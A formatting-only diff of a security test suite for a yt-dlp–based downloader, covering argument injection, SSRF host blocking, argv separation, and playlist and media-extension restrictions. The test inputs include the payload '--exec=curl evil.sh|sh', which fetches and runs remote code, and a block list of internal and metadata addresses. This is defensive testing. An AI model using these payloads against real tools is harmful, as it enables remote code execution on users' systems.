@@ -48,11 +48,7 @@ describe('L3 — argument injection (the attack shell:false does NOT stop)', () 
   it('rejects the canonical yt-dlp arbitrary-execution payload', () => {
     // The headline case from D-01 §8.4: with shell:false this is not shell injection,
     // it is a perfectly ordinary argv element that yt-dlp parses as an OPTION.
-    assertRejected(
-      validateHttpUrl('--exec=curl evil.sh|sh'),
-      'leading_dash',
-      '--exec payload',
-    );
+    assertRejected(validateHttpUrl('--exec=curl evil.sh|sh'), 'leading_dash', '--exec payload');
   });
 
   it('rejects every option-shaped input', () => {
@@ -118,13 +114,23 @@ describe('L3 — argument injection (the attack shell:false does NOT stop)', () 
 describe('L3.3 — SSRF (our own daemon listens on 127.0.0.1)', () => {
   it('blocks loopback, private, link-local and metadata addresses', () => {
     for (const host of [
-      '127.0.0.1', '127.1.2.3', '0.0.0.0', 'localhost',
-      '10.0.0.1', '172.16.0.1', '172.31.255.254', '192.168.1.1',
+      '127.0.0.1',
+      '127.1.2.3',
+      '0.0.0.0',
+      'localhost',
+      '10.0.0.1',
+      '172.16.0.1',
+      '172.31.255.254',
+      '192.168.1.1',
       '169.254.169.254', // AWS/GCE metadata
       '100.64.0.1', // CGNAT
-      '::1', 'fe80::1', 'fc00::1', 'fd12::34',
+      '::1',
+      'fe80::1',
+      'fc00::1',
+      'fd12::34',
       '::ffff:127.0.0.1', // IPv4-mapped loopback
-      'foo.local', 'db.internal',
+      'foo.local',
+      'db.internal',
     ]) {
       assert.equal(isPrivateOrReservedHost(host), true, `${host} should be blocked`);
     }
@@ -155,11 +161,16 @@ describe('L3.3 — SSRF (our own daemon listens on 127.0.0.1)', () => {
 
 describe('L6 — the argv invariant', () => {
   it('places user operands after "--" and never merges them into a flag', () => {
-    const r = buildArgv({ flags: ['--ignore-config', '-o', '%(id)s.%(ext)s'], operands: ['https://example.com/a.mp3'] });
+    const r = buildArgv({
+      flags: ['--ignore-config', '-o', '%(id)s.%(ext)s'],
+      operands: ['https://example.com/a.mp3'],
+    });
     assert.equal(r.ok, true);
     if (r.ok) {
       assert.deepEqual(r.value, [
-        '--ignore-config', '-o', '%(id)s.%(ext)s',
+        '--ignore-config',
+        '-o',
+        '%(id)s.%(ext)s',
         '--',
         'https://example.com/a.mp3',
       ]);
@@ -171,7 +182,11 @@ describe('L6 — the argv invariant', () => {
   it('still rejects a dash-leading operand even though "--" is present', () => {
     // Defence in depth: yt-dlp honours `--`, but we do not rely on every future tool
     // doing so.
-    assertRejected(buildArgv({ flags: [], operands: ['--exec=sh'] }), 'leading_dash', 'dash after --');
+    assertRejected(
+      buildArgv({ flags: [], operands: ['--exec=sh'] }),
+      'leading_dash',
+      'dash after --',
+    );
   });
 
   it('rejects operands carrying control characters', () => {
@@ -472,7 +487,13 @@ describe('L4 — playlist indirection (measured attack, T-026)', () => {
      * decode, so the protocol whitelist cannot stop this. Refusing local playlist
      * imports is what closes it.
      */
-    for (const p of ['/tmp/evil.m3u8', '/tmp/evil.m3u', '/tmp/x.pls', '/tmp/x.xspf', '/tmp/x.asx']) {
+    for (const p of [
+      '/tmp/evil.m3u8',
+      '/tmp/evil.m3u',
+      '/tmp/x.pls',
+      '/tmp/x.xspf',
+      '/tmp/x.asx',
+    ]) {
       assert.equal(isPlaylistExtension(p), true, `${p} must be recognised as a playlist`);
       assert.equal(isLocalImportSafeExtension(p), false, `${p} must not be locally importable`);
     }
@@ -636,9 +657,30 @@ describe('★ 媒体扩展名白名单 —— 拒绝侧（T-152：收敛前这�
      * **产品会去抓的远程 URL 范围变大了**，而那是一次没人要求过的行为变更。
      */
     const BEFORE_T152 = [
-      '.aac', '.aif', '.aiff', '.ass', '.avi', '.flac', '.flv', '.m3u8', '.m4a', '.m4v',
-      '.mkv', '.mov', '.mp3', '.mp4', '.oga', '.ogg', '.opus', '.srt', '.ts', '.vtt',
-      '.wav', '.webm', '.wma', '.wmv',
+      '.aac',
+      '.aif',
+      '.aiff',
+      '.ass',
+      '.avi',
+      '.flac',
+      '.flv',
+      '.m3u8',
+      '.m4a',
+      '.m4v',
+      '.mkv',
+      '.mov',
+      '.mp3',
+      '.mp4',
+      '.oga',
+      '.ogg',
+      '.opus',
+      '.srt',
+      '.ts',
+      '.vtt',
+      '.wav',
+      '.webm',
+      '.wma',
+      '.wmv',
     ];
     assert.equal(BEFORE_T152.length, 24, '锚点自己被改坏了');
     const now = [...MEDIA_EXTENSIONS].sort();
